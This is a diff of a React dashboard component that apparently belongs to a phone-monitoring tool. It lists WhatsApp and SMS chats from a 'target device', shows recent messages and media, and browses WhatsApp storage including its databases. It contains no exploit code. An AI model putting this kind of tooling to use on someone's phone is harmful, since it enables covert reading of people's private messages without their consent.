-                            const isMe = m.is_outgoing;
-                            return (
-                              <div
-                                key={m.id}
-                                className={`flex ${isMe ? "justify-end" : "justify-start"}`}
-                              >
-                                <div
-                                  className={`max-w-[82%] sm:max-w-[76%] rounded-2xl px-3 py-2 shadow-xs space-y-1 text-xs relative ${
-                                    isMe
-                                      ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-200/60"
-                                      : "bg-white text-gray-900 rounded-bl-xs border border-gray-100"
-                                  }`}
-                                >
-                                  {/* Sender name for incoming group messages */}
-                                  {!isMe && m.sender && m.sender !== selectedChat && (
-                                    <p className="text-[10px] font-bold text-emerald-700 mb-0.5">
-                                      {m.sender}
-                                    </p>
-                                  )}
-
-                                  {/* Rich Media: Voice Note */}
-                                  {m.media_type === "audio" && (
-                                    <VoiceNoteBubble
-                                      message={m}
-                                      onDownload={handleDownloadMedia}
-                                    />
-                                  )}
-
-                                  {/* Rich Media: Image */}
-                                  {m.media_type === "image" && (
-                                    <ImageBubble
-                                      message={m}
-                                      onDownload={handleDownloadMedia}
-                                    />
-                                  )}
-
-                                  {/* Rich Media: Document */}
-                                  {m.media_type === "document" && (
-                                    <DocumentBubble
-                                      message={m}
-                                      onDownload={handleDownloadMedia}
-                                    />
-                                  )}
-
-                                  {/* Rich Media: Video */}
-                                  {m.media_type === "video" && (
-                                    <VideoBubble
-                                      message={m}
-                                      onDownload={handleDownloadMedia}
-                                    />
-                                  )}
-
-                                  {/* Text content if not media-only */}
-                                  {(!m.media_type ||
-                                    (!m.message_text.startsWith("🎤") &&
-                                      !m.message_text.startsWith("📷") &&
-                                      !m.message_text.startsWith("📄") &&
-                                      !m.message_text.startsWith("🎥"))) && (
-                                    <p className="whitespace-pre-wrap break-words leading-relaxed text-[12px] text-gray-800">
-                                      {m.message_text}
-                                    </p>
-                                  )}
-
-                                  {/* Timestamp & double checkmarks */}
-                                  <div
-                                    className={`flex items-center justify-end gap-1 text-[9px] pt-0.5 ${
-                                      isMe ? "text-emerald-800/80" : "text-gray-400"
-                                    }`}
-                                  >
-                                    <span>
-                                      {new Date(m.message_time).toLocaleTimeString([], {
-                                        hour: "2-digit",
-                                        minute: "2-digit",
-                                      })}
-                                    </span>
-                                    {isMe && (
-                                      <span className="text-[#53bdeb] font-bold text-[10px]">
-                                        ✓✓
-                                      </span>
-                                    )}
-                                  </div>
-                                </div>
-                              </div>
-                            );
-                          })}
-                        </div>
-                      ))
+                        ✕
+                      </button>
                     )}
                   </div>
-                </>
-              ) : (
-                <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
-                  <span className="text-4xl block">💬</span>
-                  <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
-                  <p className="text-xs text-gray-400 max-w-sm">
-                    Select a WhatsApp chat on the left panel to read the full conversation thread and media files from the last 5 days.
-                  </p>
+                  <div className="flex items-center justify-between text-[10px] text-gray-400 px-1 pt-1">
+                    <span>
+                      {filteredChats.length} {filteredChats.length === 1 ? "conversation" : "conversations"} on device
+                    </span>
+                    <span className="font-semibold text-emerald-600">● Live</span>
+                  </div>
                 </div>
-              )}
-            </div>
-          </>
-        )}
+
+                {/* Chats List */}
+                <div className="flex-1 overflow-y-auto divide-y divide-gray-100">
+                  {loading && activeChatList.length === 0 ? (
+                    <div className="p-8 text-center text-xs text-gray-400 space-y-1">
+                      <span className="animate-spin text-lg block">↻</span>
+                      <p>Loading real chats from device...</p>
+                    </div>
+                  ) : filteredChats.length === 0 ? (
+                    <div className="p-8 text-center text-xs text-gray-400 space-y-2">
+                      <span className="text-2xl block">💬</span>
+                      <p className="font-semibold text-gray-700">No chats found on device</p>
+                      <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
+                        {selectedApp === "whatsapp"
+                          ? "No WhatsApp chats have been saved from this phone yet. Open WhatsApp on the device or wait for incoming notifications to sync."
+                          : "No SMS message logs have been recorded for this device yet."}
+                      </p>
+                      {selectedApp === "whatsapp" && smsChatThreads.length > 0 && (
+                        <button
+                          type="button"
+                          onClick={() => setSelectedApp("sms")}
+                          className="mt-2 text-[11px] font-semibold text-blue-600 hover:underline"
+                        >
+                          View Phone SMS Chats ({smsChatThreads.length}) →
+                        </button>
+                      )}
+                    </div>
+                  ) : (
+                    filteredChats.map((c) => {
+                      const isSelected = selectedChatId === c.id;
+                      return (
+                        <div
+                          key={c.id}
+                          onClick={() => setSelectedChatId(c.id)}
+                          className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
+                            isSelected
+                              ? "bg-emerald-50/50 border-l-4 border-emerald-500"
+                              : "hover:bg-gray-50/80"
+                          }`}
+                        >
+                          {/* Avatar */}
+                          <div
+                            className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
+                              c.source === "whatsapp"
+                                ? "bg-gradient-to-br from-emerald-500 to-teal-600"
+                                : "bg-gradient-to-br from-blue-500 to-indigo-600"
+                            }`}
+                          >
+                            {c.chatName.charAt(0).toUpperCase()}
+                            <span className="absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full bg-emerald-400 border-2 border-white" />
+                          </div>
+
+                          {/* Chat Information */}
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center justify-between gap-1 mb-0.5">
+                              <h4 className="text-xs font-bold text-gray-900 truncate">
+                                {c.chatName}
+                              </h4>
+                              <span className="text-[10px] text-gray-400 shrink-0 font-medium">
+                                {timeAgo(c.lastMessageAt)}
+                              </span>
+                            </div>
+
+                            {c.subtitle && (
+                              <p className="text-[10px] text-gray-400 font-mono truncate mb-0.5">
+                                {c.subtitle}
+                              </p>
+                            )}
+
+                            <p className="text-[11px] text-gray-500 truncate flex items-center gap-1">
+                              {c.lastIsOutgoing && (
+                                <span className="text-emerald-600 font-bold text-[11px]">✓✓</span>
+                              )}
+                              <span className="truncate">{c.lastMessage || "(No text)"}</span>
+                            </p>
+
+                            <div className="mt-1 flex items-center gap-1.5">
+                              <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
+                                {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
+                              </span>
+                              <span className="text-[9px] font-medium uppercase px-1.5 py-0.2 rounded bg-gray-50 text-gray-500 border border-gray-100">
+                                {c.source === "whatsapp" ? "WhatsApp" : "SMS"}
+                              </span>
+                            </div>
+                          </div>
+                        </div>
+                      );
+                    })
+                  )}
+                </div>
+              </div>
+
+              {/* ----------------------------------------------------------- */}
+              {/* COLUMN 3: SELECTED CHAT CONVERSATION (LAST 5 DAYS DATA)      */}
+              {/* ----------------------------------------------------------- */}
+              <div className="md:col-span-5 lg:col-span-6 flex flex-col bg-slate-100/60">
+                {selectedChatSummary ? (
+                  <>
+                    {/* Conversation Header */}
+                    <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs">
+                      <div className="flex items-center gap-3 min-w-0">
+                        <div
+                          className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
+                            selectedChatSummary.source === "whatsapp"
+                              ? "bg-emerald-600"
+                              : "bg-blue-600"
+                          }`}
+                        >
+                          {selectedChatSummary.chatName.charAt(0).toUpperCase()}
+                        </div>
+                        <div className="min-w-0">
+                          <h3 className="text-xs font-bold text-gray-900 truncate">
+                            {selectedChatSummary.chatName}
+                          </h3>
+                          <p className="text-[10px] text-gray-400 flex items-center gap-1">
+                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
+                            <span>
+                              {selectedChatSummary.subtitle || selectedChatSummary.source.toUpperCase()} • Last 5 Days Activity
+                            </span>
+                          </p>
+                        </div>
+                      </div>
+
+                      <div className="flex items-center gap-2">
+                        <div className="bg-gray-100 p-0.5 rounded-md flex text-[10px] font-medium">
+                          <button
+                            type="button"
+                            onClick={() => setTimeFilter("5days")}
+                            className={`px-2 py-0.5 rounded transition ${
+                              timeFilter === "5days"
+                                ? "bg-white text-gray-900 shadow-2xs font-semibold"
+                                : "text-gray-500 hover:text-gray-900"
+                            }`}
+                          >
+                            Last 5 Days
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => setTimeFilter("all")}
+                            className={`px-2 py-0.5 rounded transition ${
+                              timeFilter === "all"
+                                ? "bg-white text-gray-900 shadow-2xs font-semibold"
+                                : "text-gray-500 hover:text-gray-900"
+                            }`}
+                          >
+                            All ({selectedChatSummary.totalMessages})
+                          </button>
+                        </div>
+                        <span
+                          className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full border ${
+                            selectedChatSummary.source === "whatsapp"
+                              ? "bg-emerald-50 text-emerald-700 border-emerald-200"
+                              : "bg-blue-50 text-blue-700 border-blue-200"
+                          }`}
+                        >
+                          {activeThreadMessages.length} msgs
+                        </span>
+                      </div>
+                    </div>
+
+                    {/* Messages Scroll Canvas */}
+                    <div className="flex-1 p-4 overflow-y-auto space-y-4 bg-[#efeae2]/40 bg-[radial-gradient(#d1d5db_1px,transparent_1px)] [background-size:16px_16px]">
+                      {messagesLoading ? (
+                        <div className="text-center py-12 text-xs text-gray-400">
+                          Loading messages...
+                        </div>
+                      ) : activeThreadMessages.length === 0 ? (
+                        <div className="text-center py-14 text-xs text-gray-400 space-y-2">
+                          <p className="font-semibold text-gray-700">
+                            No messages exchanged in the last 5 days
+                          </p>
+                          <p className="text-[11px] text-gray-400">
+                            Older messages exist outside the 5-day window.
+                          </p>
+                          <button
+                            type="button"
+                            onClick={() => setTimeFilter("all")}
+                            className="text-emerald-700 font-semibold underline text-[11px]"
+                          >
+                            Show all {selectedChatSummary.totalMessages} stored messages →
+                          </button>
+                        </div>
+                      ) : (
+                        groupedMessages.map((group) => (
+                          <div key={group.dateLabel} className="space-y-3">
+                            {/* Date Badge */}
+                            <div className="flex items-center justify-center">
+                              <span className="text-[10px] font-semibold px-2.5 py-0.5 rounded-full bg-white/80 text-gray-600 shadow-2xs border border-gray-200/60 uppercase tracking-wide">
+                                {group.dateLabel}
+                              </span>
+                            </div>
+
+                            {/* Chat Speech Bubbles */}
+                            {group.items.map((m) => {
+                              const isMe = m.isOutgoing;
+                              return (
+                                <div
+                                  key={m.id}
+                                  className={`flex ${isMe ? "justify-end" : "justify-start"}`}
+                                >
+                                  <div
+                                    className={`max-w-[82%] sm:max-w-[76%] rounded-2xl px-3.5 py-2 shadow-xs space-y-1 text-xs relative ${
+                                      isMe
+                                        ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-200/60"
+                                        : "bg-white text-gray-900 rounded-bl-xs border border-gray-100"
+                                    }`}
+                                  >
+                                    {!isMe && m.sender && (
+                                      <p className="text-[10px] font-bold text-emerald-700 mb-0.5">
+                                        {m.sender}
+                                      </p>
+                                    )}
+
+                                    {/* Media: Audio Voice Note */}
+                                    {m.mediaType === "audio" && (
+                                      <div className="py-1 flex items-center justify-between gap-3 border-b border-black/5 pb-1 mb-1">
+                                        <span className="font-semibold text-xs flex items-center gap-1">
+                                          <span>🎙️</span>
+                                          <span>Voice Note (.opus)</span>
+                                        </span>
+                                        {m.mediaPath && (
+                                          <button
+                                            type="button"
+                                            onClick={() => handleDownloadMedia(m.mediaPath!, "voice_note.opus")}
+                                            className="text-[10px] text-emerald-700 hover:underline font-semibold"
+                                          >
+                                            Download ⬇
+                                          </button>
+                                        )}
+                                      </div>
+                                    )}
+
+                                    {/* Media: Image Photo */}
+                                    {m.mediaType === "image" && (
+                                      <div className="py-1 space-y-1">
+                                        {m.mediaPath && m.mediaPath.startsWith("http") ? (
+                                          <img
+                                            src={m.mediaPath}
+                                            alt="Chat attachment"
+                                            className="w-full max-h-48 object-cover rounded-lg"
+                                          />
+                                        ) : (
+                                          <div className="flex items-center justify-between gap-3 border-b border-black/5 pb-1">
+                                            <span className="font-semibold text-xs flex items-center gap-1">
+                                              <span>📷</span>
+                                              <span>Photo Attachment</span>
+                                            </span>
+                                            {m.mediaPath && (
+                                              <button
+                                                type="button"
+                                                onClick={() => handleDownloadMedia(m.mediaPath!, "photo.jpg")}
+                                                className="text-[10px] text-emerald-700 hover:underline font-semibold"
+                                              >
+                                                Download ⬇
+                                              </button>
+                                            )}
+                                          </div>
+                                        )}
+                                      </div>
+                                    )}
+
+                                    {/* Text Body */}
+                                    <p className="whitespace-pre-wrap break-words leading-relaxed text-[12px] text-gray-800">
+                                      {m.text}
+                                    </p>
+
+                                    {/* Timestamp & double checkmarks */}
+                                    <div
+                                      className={`flex items-center justify-end gap-1 text-[9px] pt-0.5 ${
+                                        isMe ? "text-emerald-800/80" : "text-gray-400"
+                                      }`}
+                                    >
+                                      <span>
+                                        {new Date(m.timestamp).toLocaleTimeString([], {
+                                          hour: "2-digit",
+                                          minute: "2-digit",
+                                        })}
+                                      </span>
+                                      {isMe && (
+                                        <span className="text-[#53bdeb] font-bold text-[10px]">
+                                          ✓✓
+                                        </span>
+                                      )}
+                                    </div>
+                                  </div>
+                                </div>
+                              );
+                            })}
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  </>
+                ) : (
+                  <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
+                    <span className="text-4xl block">💬</span>
+                    <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
+                    <p className="text-xs text-gray-400 max-w-sm">
+                      Select a chat on the left panel to display the conversation thread and messages from the last 5 days.
+                    </p>
+                  </div>
+                )}
+              </div>
+            </>
+          )}
 
         {/* =================================================================== */}
-        {/* WHATSAPP FILE EXPLORER VIEW (WHEN USER CLICKS "FILE EXPLORER")      */}
+        {/* WHATSAPP RAW STORAGE FILE MANAGER                                   */}
         {/* =================================================================== */}
         {selectedApp === "whatsapp" && activeView === "files" && (
           <div className="md:col-span-9 lg:col-span-9.5 p-5 space-y-4 bg-white overflow-y-auto">
-            {/* Controls Bar */}
             <div className="flex flex-wrap items-center justify-between gap-3 bg-gray-50 p-3 rounded-lg border border-gray-100">
               <div className="flex items-center gap-2">
                 <button
@@ -1546,15 +1181,12 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                 )}
               </div>
 
-              {/* Category Pills */}
               <div className="flex flex-wrap gap-1 text-[11px]">
                 <button
                   type="button"
                   onClick={() => setCategoryFilter("all")}
                   className={`px-2.5 py-1 rounded-md transition font-medium ${
-                    categoryFilter === "all"
-                      ? "bg-gray-800 text-white"
-                      : "bg-white border text-gray-600 hover:bg-gray-50"
+                    categoryFilter === "all" ? "bg-gray-800 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                   }`}
                 >
                   All Folders
@@ -1563,9 +1195,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   type="button"
                   onClick={() => setCategoryFilter("images")}
                   className={`px-2.5 py-1 rounded-md transition font-medium ${
-                    categoryFilter === "images"
-                      ? "bg-emerald-700 text-white"
-                      : "bg-white border text-gray-600 hover:bg-gray-50"
+                    categoryFilter === "images" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                   }`}
                 >
                   📷 Images
@@ -1574,9 +1204,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   type="button"
                   onClick={() => setCategoryFilter("voice")}
                   className={`px-2.5 py-1 rounded-md transition font-medium ${
-                    categoryFilter === "voice"
-                      ? "bg-emerald-700 text-white"
-                      : "bg-white border text-gray-600 hover:bg-gray-50"
+                    categoryFilter === "voice" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                   }`}
                 >
                   🎙️ Voice Notes & Audio
@@ -1585,9 +1213,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   type="button"
                   onClick={() => setCategoryFilter("docs")}
                   className={`px-2.5 py-1 rounded-md transition font-medium ${
-                    categoryFilter === "docs"
-                      ? "bg-emerald-700 text-white"
-                      : "bg-white border text-gray-600 hover:bg-gray-50"
+                    categoryFilter === "docs" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                   }`}
                 >
                   📄 Documents
@@ -1596,9 +1222,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   type="button"
                   onClick={() => setCategoryFilter("db")}
                   className={`px-2.5 py-1 rounded-md transition font-medium ${
-                    categoryFilter === "db"
-                      ? "bg-emerald-700 text-white"
-                      : "bg-white border text-gray-600 hover:bg-gray-50"
+                    categoryFilter === "db" ? "bg-emerald-700 text-white" : "bg-white border text-gray-600 hover:bg-gray-50"
                   }`}
                 >
                   💾 Databases & Crypt
@@ -1606,7 +1230,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               </div>
             </div>
 
-            {/* Breadcrumbs */}
             {files && categoryFilter === "all" && (
               <div className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-50 rounded-lg text-xs font-mono overflow-x-auto text-gray-600">
                 <button
@@ -1635,7 +1258,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               </div>
             )}
 
-            {/* Files Table */}
             {files ? (
               <div className="border border-gray-200 rounded-lg overflow-hidden">
                 <div className="max-h-96 overflow-y-auto">
@@ -1723,7 +1345,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   Inspect WhatsApp Media Files & Databases
                 </h4>
                 <p className="text-xs text-gray-500 max-w-md mx-auto leading-relaxed">
-                  Click "Scan WhatsApp Storage" above to inspect WhatsApp's actual folder tree (Images, Voice Notes, Documents, and Databases) on the target device like a dedicated file manager.
+                  Click "Scan WhatsApp Storage" above to inspect WhatsApp's actual folder tree (Images, Voice Notes, Documents, and Databases) on the target device.
                 </p>
               </div>
             )}
